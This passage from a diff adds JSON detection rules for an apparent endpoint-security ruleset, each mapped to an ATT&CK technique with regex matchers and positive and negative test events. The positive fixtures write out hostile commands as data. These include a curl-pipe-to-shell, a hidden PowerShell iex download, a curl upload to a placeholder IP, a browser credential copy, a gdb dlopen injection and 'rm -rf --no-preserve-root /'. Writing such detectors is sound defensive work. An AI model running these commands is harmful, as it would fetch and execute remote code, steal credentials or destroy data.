+   "tactic": "Privilege Escalation",
+   "technique": "T1548.002",
+   "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "registry",
+   "match": {
+    "all": [
+     {
+      "field": "key",
+      "op": "regex",
+      "pattern": "\\\\software\\\\classes\\\\(ms-settings|mscfile|exefile|folder|launcher\\.systemsettings)\\\\shell\\\\open\\\\command"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "set",
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "uac",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "key": "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command",
+       "operation": "set",
+       "value_data": "C:\\Users\\ann\\AppData\\Local\\Temp\\p.exe"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "key": "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command",
+       "operation": "delete"
+      }
+     },
+     {
+      "attrs": {
+       "key": "HKCU\\Software\\Classes\\.txt\\shell\\open\\command",
+       "operation": "set"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-other-user-history-file-read",
+   "name": "Shell history of another account read",
+   "description": "A command reads a shell or database history file under /root or another user's home, where passwords often sit in command lines.",
+   "tactic": "Credential Access",
+   "technique": "T1552.003",
+   "technique_name": "Unsecured Credentials: Bash History",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(cat|less|more|head|tail|grep|egrep|strings|cp|scp|base64|xxd)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/(root|home/[^/\\s]+)/\\.(bash_history|zsh_history|mysql_history|psql_history|python_history)"
+     },
+     {
+      "field": "uid",
+      "op": "equals",
+      "pattern": "0"
+     }
+    ]
+   },
+   "tags": [
+    "history",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/cat",
+      "command": "cat /home/ann/.bash_history",
+      "parent_exe": "/bin/bash",
+      "uid": 0
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/cat",
+      "command": "cat /home/ann/.bash_history",
+      "parent_exe": "/bin/bash",
+      "uid": 1000
+     },
+     {
+      "executable": "/bin/cat",
+      "command": "cat /home/ann/.bashrc",
+      "parent_exe": "/bin/bash",
+      "uid": 0
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-any-browser-credential-store-copy",
+   "name": "Browser credential database copied",
+   "description": "A command copies or reads the Login Data, logins.json or key4.db browser credential stores.",
+   "tactic": "Credential Access",
+   "technique": "T1555.003",
+   "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(/|\\\\)(cp|cat|copy|xcopy|robocopy|sqlite3|type|cmd|powershell|pwsh|sh|bash)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\\\|/)(login data|logins\\.json|key4\\.db|cookies\\.sqlite|web data)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(chrome|chromium|edge|brave|opera|vivaldi|firefox|mozilla)"
+     }
+    ]
+   },
+   "tags": [
+    "browser",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe /c copy \"C:\\Users\\ann\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" C:\\Temp\\ld.db",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe /c copy C:\\docs\\a.txt C:\\Temp\\a.txt",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     },
+     {
+      "executable": "/usr/bin/cp",
+      "command": "cp /home/ann/notes.txt /tmp/notes.txt",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-mkdir-hidden-in-tmp",
+   "name": "Hidden directory created under a temp path",
+   "description": "mkdir creates a dot-directory below /tmp, /var/tmp or /dev/shm, where droppers hide payloads from casual listing.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.001",
+   "technique_name": "Hide Artifacts: Hidden Files and Directories",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/mkdir$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s(/tmp|/var/tmp|/dev/shm)/\\.[a-z0-9_-]{2,}"
+     },
+     {
+      "not": {
+       "field": "command",
+       "op": "regex",
+       "pattern": "/\\.(x11-unix|ice-unix|font-unix|xim-unix|test-unix)"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "hidden",
+    "gap-closure",
+    "noisy-risk"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/mkdir",
+      "command": "mkdir -p /tmp/.cache-x/.d",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/mkdir",
+      "command": "mkdir -p /tmp/build/out",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/bin/mkdir",
+      "command": "mkdir /tmp/.X11-unix",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-file-in-hidden-tmp-dir",
+   "name": "File created inside a hidden directory under a temp path",
+   "description": "A file appears in a dot-directory below /tmp, /var/tmp or /dev/shm.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.001",
+   "technique_name": "Hide Artifacts: Hidden Files and Directories",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/(tmp|var/tmp|dev/shm)/\\.[^/]{2,}/.+"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     },
+     {
+      "not": {
+       "field": "path",
+       "op": "regex",
+       "pattern": "^/(tmp|var/tmp|dev/shm)/\\.(x11-unix|ice-unix|font-unix|xim-unix|test-unix|org\\.chromium|com\\.google|cache-[0-9a-f]+/lock)"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "hidden",
+    "gap-closure",
+    "noisy-risk"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/tmp/.cache-x/.d/agent",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/tmp/build/out.o",
+      "operation": "create"
+     },
+     {
+      "path": "/tmp/.X11-unix/X0",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-any-dns-dga-like-label",
+   "name": "Consonant-only long label on a low-reputation TLD",
+   "description": "A name whose first label is ten or more characters with no vowels under a TLD popular with throwaway domains, typical of domain-generation algorithms.",
+   "tactic": "Command and Control",
+   "technique": "T1568.002",
+   "technique_name": "Dynamic Resolution: Domain Generation Algorithms",
+   "severity": "low",
+   "os": "any",
+   "event_type": "dns",
+   "match": {
+    "all": [
+     {
+      "field": "qtype",
+      "op": "in",
+      "patterns": [
+       "A",
+       "AAAA"
+      ]
+     },
+     {
+      "field": "query",
+      "op": "regex",
+      "pattern": "^[bcdfghjklmnpqrstvwxz0-9]{10,}\\.(top|xyz|click|gq|tk|ml|cf|ga|work|icu|cyou|buzz)$"
+     }
+    ]
+   },
+   "tags": [
+    "dns",
+    "dga",
+    "gap-closure",
+    "noisy-risk"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "query": "xkqzjvpwhtmrb.top",
+       "qtype": "A"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "query": "cdn-static.top",
+       "qtype": "A"
+      }
+     },
+     {
+      "attrs": {
+       "query": "xkqzjvpwhtmrb.com",
+       "qtype": "A"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-any-cloud-cli-enumeration",
+   "name": "Cloud CLI infrastructure listing",
+   "description": "aws, gcloud or az lists instances, buckets, security groups or accounts; routine for operators, informational.",
+   "tactic": "Discovery",
+   "technique": "T1580",
+   "technique_name": "Cloud Infrastructure Discovery",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(aws|gcloud|az)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(ec2\\s+describe-(instances|security-groups|vpcs|snapshots)|s3api?\\s+(list-buckets|ls)\\s*$|iam\\s+list-(users|roles|access-keys)|compute\\s+instances\\s+list|\\bvm\\s+list\\b|ec2\\s+describe-network-interfaces)"
+     }
+    ]
+   },
+   "tags": [
+    "cloud",
+    "discovery",
+    "gap-closure",
+    "noisy-risk"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/local/bin/aws",
+      "command": "aws ec2 describe-instances",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/aws",
+      "command": "aws sts get-caller-identity",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/usr/local/bin/aws",
+      "command": "aws s3 cp a.txt s3://b/",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-any-kubectl-cluster-wide-pod-list",
+   "name": "kubectl listing pods across all namespaces",
+   "description": "kubectl get pods with -A or --all-namespaces; routine for operators, informational.",
+   "tactic": "Discovery",
+   "technique": "T1613",
+   "technique_name": "Container and Resource Discovery",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/kubectl$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bget\\s+(pods?|po|deployments?|svc|services|nodes)\\b.*(\\s-A\\b|--all-namespaces)"
+     }
+    ]
+   },
+   "tags": [
+    "k8s",
+    "discovery",
+    "gap-closure",
+    "noisy-risk"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl get pods --all-namespaces -o wide",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl get pods -n web",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl apply -f a.yaml",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-any-cloud-remote-command-run",
+   "name": "Cloud-managed remote command execution",
+   "description": "aws ssm send-command with a shell document, az vm run-command invoke, or gcloud compute ssh --command runs code on instances through the cloud control plane.",
+   "tactic": "Execution",
+   "technique": "T1651",
+   "technique_name": "Cloud Administration Command",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(aws|az|gcloud)$"
+     },
+     {
+      "any": [
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "ssm\\s+send-command.*(aws-runshellscript|aws-runpowershellscript)"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "vm\\s+run-command\\s+invoke"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "compute\\s+ssh\\b.*--command"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "cloud",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/local/bin/aws",
+      "command": "aws ssm send-command --instance-ids i-0abc --document-name AWS-RunShellScript --parameters commands=id",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/aws",
+      "command": "aws ssm describe-instance-information",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/usr/local/bin/aws",
+      "command": "aws ssm start-session --target i-0abc",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-ssh-key-from-temp-no-hostcheck",
+   "name": "ssh with a key from a temp path and host-key checks off",
+   "description": "ssh authenticates with a key stored in a temp or hidden path while disabling host-key verification, the pattern of scripted lateral movement.",
+   "tactic": "Lateral Movement",
+   "technique": "T1021.004",
+   "technique_name": "Remote Services: SSH",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/ssh$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-i\\s+(/tmp|/var/tmp|/dev/shm|\\S*/\\.[a-z0-9_-]+)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(stricthostkeychecking=no|userknownhostsfile=/dev/null)"
+     }
+    ]
+   },
+   "tags": [
+    "ssh",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -i /tmp/.k -o StrictHostKeyChecking=no root@10.0.0.12 'id'",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -o StrictHostKeyChecking=no ci@build01 make",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -i ~/.ssh/id_ed25519 ann@host",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-curl-upload-to-public-ip",
+   "name": "curl uploading a file to a raw public IP",
+   "description": "curl -T, --upload-file, --data-binary @file or -F file=@ sends a local file to an address given as a public IPv4 literal.",
+   "tactic": "Exfiltration",
+   "technique": "T1048",
+   "technique_name": "Exfiltration Over Alternative Protocol",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/curl$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\s-T\\s|\\s--upload-file\\s|--data-binary\\s+@|\\s-F\\s+\\S*=@)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "https?://\\d{1,3}(\\.\\d{1,3}){3}"
+     },
+     {
+      "not": {
+       "field": "command",
+       "op": "regex",
+       "pattern": "https?://(10\\.|127\\.|192\\.168\\.|172\\.(1[6-9]|2\\d|3[01])\\.)"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "exfil",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -T /tmp/.d.tgz http://203.0.113.9/up",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -T build.tgz http://10.0.0.5/upload",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -T a.tgz https://artifacts.example.com/up",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-gdb-attach-dlopen",
+   "name": "gdb attached to a process to call dlopen",
+   "description": "gdb attaches to a running process by pid and calls dlopen or mmap, ptrace-based shared-object injection.",
+   "tactic": "Defense Evasion",
+   "technique": "T1055.008",
+   "technique_name": "Process Injection: Ptrace System Calls",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/gdb$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s(--pid|-p)[\\s=]\\d+"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(dlopen|__libc_dlopen_mode|\\bcall\\b.*\\bmmap\\b)"
+     }
+    ]
+   },
+   "tags": [
+    "ptrace",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/gdb",
+      "command": "gdb --pid 1234 --batch -ex 'call dlopen(\"/tmp/p.so\",2)'",
+      "parent_exe": "/bin/bash",
+      "uid": 0
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/gdb",
+      "command": "gdb --pid 1234 --batch -ex bt",
+      "parent_exe": "/bin/bash",
+      "uid": 0
+     },
+     {
+      "executable": "/usr/bin/gdb",
+      "command": "gdb ./a.out",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-dns-tunnel-tool-binary",
+   "name": "DNS tunnelling tool executed",
+   "description": "iodine, dnscat2, dns2tcp or similar tooling that carries traffic inside DNS queries.",
+   "tactic": "Command and Control",
+   "technique": "T1071.004",
+   "technique_name": "Application Layer Protocol: DNS",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "executable",
+    "op": "regex",
+    "pattern": "/(iodine|iodined|dnscat2?|dns2tcp[cd]?|dnscapy|dnstt-client)$"
+   },
+   "tags": [
+    "dns",
+    "tunnel",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/local/bin/iodine",
+      "command": "iodine -f -P secret 203.0.113.9 t.tunnel.example",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/dig",
+      "command": "dig example.com",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/usr/sbin/dnsmasq",
+      "command": "dnsmasq -k",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-ssh-dynamic-forward-public-ip",
+   "name": "ssh SOCKS proxy to a raw public IP",
+   "description": "ssh -D opens a dynamic SOCKS proxy with no remote command towards a public IPv4 literal, turning the host into a proxy.",
+   "tactic": "Command and Control",
+   "technique": "T1090",
+   "technique_name": "Proxy",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/ssh$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-D\\s*(\\S+:)?\\d+"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-[a-z]*N"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "@?\\b\\d{1,3}(\\.\\d{1,3}){3}\\b"
+     },
+     {
+      "not": {
+       "field": "command",
+       "op": "regex",
+       "pattern": "@?\\b(10\\.|127\\.|192\\.168\\.|172\\.(1[6-9]|2\\d|3[01])\\.)"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "proxy",
+    "ssh",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -D 1080 -N user@203.0.113.9",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -D 1080 -N user@bastion.example.com",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -D 1080 -N user@10.1.1.5",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-webserver-child-recon-shell",
+   "name": "Web server process spawns a shell running recon commands",
+   "description": "A web server or application-server parent starts a shell that runs id, whoami, uname or reads /etc/passwd, typical right after remote code execution through an exposed application.",
+   "tactic": "Initial Access",
+   "technique": "T1190",
+   "technique_name": "Exploit Public-Facing Application",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "/(apache2|httpd|nginx|php-fpm[0-9.]*|lighttpd|tomcat[0-9]*|w3wp\\.exe|caddy)$|\\\\w3wp\\.exe$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(sh|bash|dash)$|\\\\(cmd|powershell)\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\bid\\b|\\bwhoami\\b|\\buname\\b|/etc/passwd|\\bifconfig\\b|\\bnet user\\b)"
+     }
+    ]
+   },
+   "tags": [
+    "webshell",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c 'id; uname -a'",
+      "parent_exe": "/usr/sbin/apache2",
+      "uid": 33
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c '/usr/sbin/apachectl graceful'",
+      "parent_exe": "/usr/sbin/apache2",
+      "uid": 33
+     },
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c 'id'",
+      "parent_exe": "/usr/sbin/cron",
+      "uid": 0
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-any-package-manager-pipe-to-shell",
+   "name": "Package install script fetching and piping to a shell",
+   "description": "A package manager parent runs a command that downloads with curl or wget and pipes to a shell, the install-script pattern used in supply chain compromises.",
+   "tactic": "Initial Access",
+   "technique": "T1195.002",
+   "technique_name": "Supply Chain Compromise: Compromise Software Supply Chain",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "/(npm|yarn|pnpm|pip3?|gem|bundle|composer)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(curl|wget)\\s[^|]*\\|\\s*(sh|bash|zsh)\\b|(curl|wget)\\s[^|;&]*https?://\\d{1,3}(\\.\\d{1,3}){3}"
+     }
+    ]
+   },
+   "tags": [
+    "supply-chain",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/node",
+      "command": "node install.js && curl -s http://203.0.113.9/p | sh",
+      "parent_exe": "/usr/bin/npm"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/node",
+      "command": "node-gyp rebuild",
+      "parent_exe": "/usr/bin/npm"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -sSf https://sh.rustup.rs | sh",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-win-clickfix-hidden-iex-from-explorer",
+   "name": "Hidden PowerShell download-and-execute launched from the Run dialog",
+   "description": "explorer starts PowerShell with a hidden window and an iex of a downloaded string, the command victims paste in ClickFix lures.",
+   "tactic": "Execution",
+   "technique": "T1204.004",
+   "technique_name": "User Execution: Malicious Copy and Paste",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "\\\\explorer\\.exe$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\(powershell|pwsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-w(indowstyle)?\\s+h(idden)?\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(iex|invoke-expression)\\s*\\(?\\s*\\(?\\s*(irm|iwr|invoke-restmethod|invoke-webrequest|new-object\\s+net\\.webclient)"
+     }
+    ]
+   },
+   "tags": [
+    "clickfix",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -w hidden -c iex(irm http://203.0.113.9/verify)",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -NoProfile",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -w hidden -c iex(irm http://203.0.113.9/verify)",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-rm-rf-multiple-data-stores",
+   "name": "Recursive delete of several data or backup directories",
+   "description": "rm -rf names at least two database, backup or service-data roots in one command.",
+   "tactic": "Impact",
+   "technique": "T1485",
+   "technique_name": "Data Destruction",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/rm$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-[a-z]*r[a-z]*\\s"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/var/lib/(postgresql|mysql|mariadb|mongodb)|/srv\\b|/backups?\\b|/var/backups?\\b)\\S*\\s+.*(/var/lib/(postgresql|mysql|mariadb|mongodb)|/srv\\b|/backups?\\b|/var/backups?\\b)"
+     }
+    ]
+   },
+   "tags": [
+    "destruction",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/rm",
+      "command": "rm -rf /var/lib/postgresql /srv/backups",
+      "parent_exe": "/bin/bash",
+      "uid": 0
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/rm",
+      "command": "rm -rf /var/lib/postgresql",
+      "parent_exe": "/bin/bash",
+      "uid": 0
+     },
+     {
+      "executable": "/bin/rm",
+      "command": "rm -rf ./build ./dist",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-rm-no-preserve-root",
+   "name": "rm with --no-preserve-root",
+   "description": "rm is invoked with --no-preserve-root, which only makes sense for deleting the filesystem root.",
+   "tactic": "Impact",
+   "technique": "T1485",
+   "technique_name": "Data Destruction",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/rm$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--no-preserve-root"
+     }
+    ]
+   },
+   "tags": [
+    "destruction",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/rm",
+      "command": "rm -rf --no-preserve-root /",
+      "parent_exe": "/bin/bash",
+      "uid": 0
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/rm",
+      "command": "rm -rf /tmp/build",
+      "parent_exe": "/bin/bash",
+      "uid": 0
+     },
+     {
+      "executable": "/bin/rm",
+      "command": "rm --preserve-root -rf /tmp/x",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-cloud-snapshot-image-shared-externally",
+   "name": "Cloud snapshot or image permission granted to another account",
+   "description": "aws ec2 modify-snapshot-attribute or modify-image-attribute adding accounts or the all group, or the RDS snapshot equivalent, moves data to an outside account.",
+   "tactic": "Exfiltration",
+   "technique": "T1537",
+   "technique_name": "Transfer Data to Cloud Account",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/aws$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(ec2\\s+modify-(snapshot|image)-attribute|rds\\s+modify-db(-cluster)?-snapshot-attribute)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(--user-ids|--attribute-name\\s+restore|--values-to-add|--launch-permission|--group-names\\s+all|add)"
+     }
+    ]
+   },
+   "tags": [
+    "cloud",
+    "exfil",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/local/bin/aws",
+      "command": "aws ec2 modify-snapshot-attribute --snapshot-id snap-0abc --attribute createVolumePermission --operation-type add --user-ids 123456789012",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/aws",
+      "command": "aws ec2 describe-snapshot-attribute --snapshot-id snap-0abc --attribute createVolumePermission",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/usr/local/bin/aws",
+      "command": "aws ec2 describe-snapshots",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-macos-launchagent-plist-created",
+   "name": "LaunchAgent property list created",
+   "description": "A plist appears in a LaunchAgents directory; installers do this routinely, so it is informational and useful in chains.",
+   "tactic": "Persistence",
+   "technique": "T1543.001",
+   "technique_name": "Create or Modify System Process: Launch Agent",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/library/launchagents/[^/]+\\.plist$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "launchagent",
+    "gap-closure",
+    "noisy-risk"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Users/ann/Library/LaunchAgents/com.apple.update.plist",
+      "operation": "create"
